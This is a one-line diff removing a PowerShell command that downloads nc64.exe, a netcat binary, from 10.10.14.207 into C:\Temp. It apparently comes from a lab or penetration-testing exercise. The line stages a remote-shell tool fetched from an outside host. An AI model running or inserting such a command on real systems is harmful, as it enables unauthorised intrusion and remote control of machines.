@@ -1,1 +1,0 @@
-iwr -Uri "http://10.10.14.207/nc64.exe" -OutFile "C:\Temp\nc64.exe"
